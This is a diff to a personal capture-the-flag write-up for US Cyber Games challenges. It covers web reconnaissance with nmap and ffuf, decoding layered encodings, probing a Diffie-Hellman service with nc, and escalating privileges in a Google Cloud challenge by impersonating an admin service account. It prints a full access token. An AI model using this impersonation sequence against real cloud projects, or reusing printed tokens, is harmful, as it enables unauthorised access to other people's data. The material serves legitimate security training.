@@ -324,8 +324,41 @@ PORT     STATE SERVICE
 
 ```
 
+sudo nmap -sV -p 443 --script http-enum 143.244.222.116 
+
+
+```
+└─$ nslookup uscybercombine-s4-spreading-out.chals.io
+
+Server:         192.168.1.254
+Address:        192.168.1.254#53
+
+Non-authoritative answer:
+Name:   uscybercombine-s4-spreading-out.chals.io
+Address: 143.244.222.116
+Name:   uscybercombine-s4-spreading-out.chals.io
+Address: 143.244.222.115
+
+```
+
+- trying ffuf on the 3 http ports
+`ffuf -w /usr/share/wordlists/dirb/small.txt -u https://uscybercombine-s4-spreading-out.chals.io/FUZZ` 
+
+
+```
+//from 443
+readme                  [Status: 200, Size: 16, Words: 2, Lines: 1, Duration: 95ms]
+wwwlog                  [Status: 403, Size: 22, Words: 3, Lines: 1, Duration: 53ms]
+
+```
+
+
+not much... let's try recusion
+
+
 Possible lead...
 dirb https://uscybercombine-s4-spreading-out.chals.io/static/
+
 
 
 `curl -X GET "https://uscybercombine-s4-spreading-out.chals.io/" -H "Content-type: text/xml; charset=UTF-8"`
@@ -335,6 +368,186 @@ dirb https://uscybercombine-s4-spreading-out.chals.io/static/
 
 ### task
 ```js
+Biocheck [Web]
+150
+ARIA has started making simple applications to display their intelligence, but they're still in a rough state. Break in, and discover the critical information!
+
+https://uscybercombine-s4-biocheck.chals.io/
+
 ```
 
 ### My solve
+
+
+## Cloud Storage [Misc]
+
+### Task 
+```js
+Cloud Storage [Misc]
+150
+Have you heard about this "cloud" thing that everyone is using? I think we can save a bunch of money by putting our cat photos there!
+
+I have provided a service account key that you can use to authenticate and check that you can access the photos.
+
+That service account shouldn't have access to anything other than the cat pictures, but this whole "eye aye em" thing is a bit confusing, so I'm not entirely sure!
+
+We can't afford to have another data breach, so we need to be confident that our flags are secure before we make the switch.
+
+https://ctfd.uscybergames.com/files/f52f1b2363af0e38e2fb053fd6e42582/lateral-replica-423406-n3-f892e5bfb33b.json?token=eyJ1c2VyX2lkIjoxOTYyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyMzJ9.Zlsl_g.ZtMEVTrx0e41DOpoQAqVZU3Q7CE
+```
+
+### My solve
+
+- hint is referring to `IAM` service, which is identity account manager for cloud services - HUGEEE
+- provided json file has a private key to their GCP bucket
+
+
+#### but first we must install glcoud SDK
+```
+sudo apt-get update
+sudo apt-get install -y apt-transport-https ca-certificates gnupg
+echo "deb https://packages.cloud.google.com/apt cloud-sdk main" | sudo tee -a /etc/apt/sources.list.d/google-cloud-sdk.list
+curl https://packages.cloud.google.com/apt/doc/apt-key.gpg | sudo apt-key add -
+sudo apt-get update
+sudo apt-get install -y google-cloud-sdk
+
+```
+
+#### Then actually login
+
+```bash
+gcloud auth activate-service-account --key-file=/home/kali/Desktop/ctfFolders/CyberGames2023/cloudStorage/lateral-replica-423406-n3-f892e5bfb33b.json
+
+gcloud config set project lateral-replica-423406-n3
+
+gsutil ls
+gs://uscg-2024-bgr-cat-pictures/
+gs://uscg-2024-bgr-flags/
+
+gsutil ls gs://uscg-2024-bgr-flags/
+gs://uscg-2024-bgr-flags/flag.txt <--- so close.. but no access
+
+
+
+gcloud iam service-accounts list
+
+DISPLAY NAME           EMAIL                                                                    DISABLED
+admin-service-account  admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com  False
+user-service-account   user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com   False
+```
+
+- check for service account impersonation 
+
+```bash
+gcloud config set account user-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com
+gcloud config set project lateral-replica-423406-n3
+
+
+gcloud iam roles list --project lateral-replica-423406-n3
+
+---
+etag: BwYYef-3SNU=
+name: projects/lateral-replica-423406-n3/roles/impersonate_admin
+title: impersonate_admin
+---
+description: users can do some things!
+etag: BwYYekyQ090=
+name: projects/lateral-replica-423406-n3/roles/user_account_permissions
+title: user_account_permissions
+
+
+gcloud auth print-access-token --impersonate-service-account=admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com
+
+WARNING: This command is using service account impersonation. All API calls will be executed as [admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com].
+ya29.c.c0AY_VpZiLgt3R41Ji6gYsnfnBrb0znU3v14irMm37zf3lVxnpqzQ7aah1AUFON0Hi-junZ6NkFfEJEFLwCkMyKr5-eouKTTZZ55LF2r4_w9cBUZLwvxxllwNXg4jcYEz9DHGkSgwyGqd9Tw1Yd4tCggqxMI6INgH3Gt4oxV62kj2yNGIKhYr1Qg5BIqSK7I4ksifBv376h53OR5stOfNxPpijc8SHyGMTBFSMMm9vR-UL4ktXaquXaTzbRhGvF5GmV-GyIfZZ0HVDyGA7ksIYpgk4s9tKp7b7OKaD11Vmu-lridgf8adxiEFebHfuc4rAu0if8xk-n8Ajw-gPxs9EYwWeNHAfwWZIErmXvgiuXiRfYHNd-eEE-hixeRMAhLoPIZibiEsnZsQyHLVZWSrM4Q3Wsq1ys9f_1XoSzaEweADuY3XWNCzyYxFe8mXAEpgoVkAJoLyMrspHlDToB-43xrTTUHNURq80lNkvv1RidqfypCM4PnuyL-aGvbcqUuz9BOYWuDO5xy2NsX1-6W2qRbPtUL0HWGSVLEaQD9f_KsXLCu2KI3YYy9Z0Qm3K5nIq1b3B4bmiR4kmIG-gHA24HSuWASsRYHgs-QIIlUGobf9DAssYImcT636CM8RcXY3abj0psugVoB70Qz1cgXe9UIsu0MWYlkX_1nsgUm2yJm-O5l4J8FZuO4njvXyiZsYWOxtmR471Y6sjpVdBxw2u_xQ6bb1nq40R0Baqd2b9q82UilibckyX4yRtRUWto2p96r-X-pcmlkIbti0g9tz33QbXo2e-7nlgQuWRb2wI9hJSv7xOWuOmo_3mv20f7lk1417JrSz7FQe8xvqYtfnhBwlaMcOeoIX6MI920kOI6aZsZpX2ysqvJQ3lcQwVi62sh_uIojzO2w_1Y2Vfj2MJV97h3i3Z-mt6exZSa8UwX0kU_x7iBU1eyaymgJRt6Oh4jr_4dxoOok6nMsV28WQ8SJ45cImebJcq-p9cUm0FaOwSYO2b-t5o8UF
+
+
+```
+- BINGO! Now to use the token to set that auth token as ourselves
+
+```bash
+export CLOUDSDK_AUTH_ACCESS_TOKEN=ya29.c.c0AY_VpZiLgt3R41Ji6gYsnfnBrb0znU3v14irMm37zf3lVxnpqzQ7aah1AUFON0Hi-junZ6NkFfEJEFLwCkMyKr5-eouKTTZZ55LF2r4_w9cBUZLwvxxllwNXg4jcYEz9DHGkSgwyGqd9Tw1Yd4tCggqxMI6INgH3Gt4oxV62kj2yNGIKhYr1Qg5BIqSK7I4ksifBv376h53OR5stOfNxPpijc8SHyGMTBFSMMm9vR-UL4ktXaquXaTzbRhGvF5GmV-GyIfZZ0HVDyGA7ksIYpgk4s9tKp7b7OKaD11Vmu-lridgf8adxiEFebHfuc4rAu0if8xk-n8Ajw-gPxs9EYwWeNHAfwWZIErmXvgiuXiRfYHNd-eEE-hixeRMAhLoPIZibiEsnZsQyHLVZWSrM4Q3Wsq1ys9f_1XoSzaEweADuY3XWNCzyYxFe8mXAEpgoVkAJoLyMrspHlDToB-43xrTTUHNURq80lNkvv1RidqfypCM4PnuyL-aGvbcqUuz9BOYWuDO5xy2NsX1-6W2qRbPtUL0HWGSVLEaQD9f_KsXLCu2KI3YYy9Z0Qm3K5nIq1b3B4bmiR4kmIG-gHA24HSuWASsRYHgs-QIIlUGobf9DAssYImcT636CM8RcXY3abj0psugVoB70Qz1cgXe9UIsu0MWYlkX_1nsgUm2yJm-O5l4J8FZuO4njvXyiZsYWOxtmR471Y6sjpVdBxw2u_xQ6bb1nq40R0Baqd2b9q82UilibckyX4yRtRUWto2p96r-X-pcmlkIbti0g9tz33QbXo2e-7nlgQuWRb2wI9hJSv7xOWuOmo_3mv20f7lk1417JrSz7FQe8xvqYtfnhBwlaMcOeoIX6MI920kOI6aZsZpX2ysqvJQ3lcQwVi62sh_uIojzO2w_1Y2Vfj2MJV97h3i3Z-mt6exZSa8UwX0kU_x7iBU1eyaymgJRt6Oh4jr_4dxoOok6nMsV28WQ8SJ45cImebJcq-p9cUm0FaOwSYO2b-t5o8UF
+```
+
+- next set our gcloud account to the admin 
+```bash
+gcloud config set account admin-service-account@lateral-replica-423406-n3.iam.gserviceaccount.com
+```
+
+
+
+## Let Em Cook [Crypto]
+
+### Task
+```bash
+Let Em Cook [Crypto]
+150
+Someone cooked up some weird text
+
+https://ctfd.uscybergames.com/files/e9eb2ac473c1e755d0acf38582547080/challenge.txt?token=eyJ1c2VyX2lkIjoxOTYyLCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoyNzd9.ZltMqQ.OALNRM3M7SfaE5kAG9flGE5NgAE 
+```
+
+- Hint is referring to CyberChef. COOK THIS SHIT UP!!! 
+
+- base64 encoding
+```
+QnV0IGlz IHRoYXQg dGhlIG9u bHkgYmFz
+ZSB0aGF0 IENURnMg d2lsbCB0 cnkgYW5k
+IHVzZSB0 byB0cmlj ayB5b3U/ DQoNCjpN
+WEJhK0Yu bUorRDVW NytFVjoq RjxHJThG
+PEdJPkc5 QkkiR0Iu VkRBS1lR LUFURSc8
+QlBEP3Mr REdeOTst LTFhPCo6 Z18kNFI+
+REdeOktV QmxTR0FC bFJnIkZD bz4zRGc8
+SUtGPEdP SUNqSTQ+ QjZuUURG PEdtREY8
+R1s7SD5k U0ArRCM4 LENOM3Az RkRFIjhG
+RiQubyUx M09PMihM WDMuNVk8 YUJLOHBP
+QksmZDcr dHVrP0JQ OHRwQ0w3
+
+----- base64
+But is that the only base that CTFs will try and use to trick you?
+:MXBa+F.mJ+D5V7+EV:*F<G%8F<GI>G9BI"GB.VDAKYQ-ATE'<BPD?s+DG^9;--1a<*:g_$4R>DG^:KUBlSGABlRg"FCo>3Dg<IKF<GOICjI4>B6nQDF<GmDF<G[;H>dS@+D#8,CN3p3FDE"8FF$.o%13OO2(LX3.5Y<aBK8pOBK&d7+tuk?BP8tpCL7
+
+----- base85 
+Okay you got that but now I wrote everything in QWERTY.
+Wxz viqz iqhhtfl oy vt pxlz kgzqzt zit tfzokt eiqkqeztk ltz? 
+5+8$)4]0h9Q;h7Q%"0Q%hh-Qk_
+
+---- Keyboard Cipher - QWERTY
+But what happens if we just rotate the entire character set? 
+5+8$)4]0p9A;p7A%"0A%pp-Ar_
+
+---- ROT47 (124)
+SIVBGR{N0W_Y0U_C@N_C00K_2}
+
+```
+
+
+## What's the Diffie [Crypto]
+
+### Task 
+
+```bash
+What's Diffie [Crypto]
+150
+Alice and Bob have been experimenting with a way to send flags back and forth securely. Can you intercept their messages?
+
+nc 0.cloud.chals.io 32820
+```
+
+Reach out the the server and keep listening
+`echo "Hello" | nc 0.cloud.chals.io 32820 -v -l`
+
+- I get the response (sometimes):
+```
+g = 12
+p = 53
+a = 8 
+b = 67 
+```
+
+- Looks like I might have been temp blocked for nc so many often. Will try again later.
+
+`
+while true; do echo "47" | nc 165.227.210.30 -p 32820 -v; sleep 1; done
+`
+
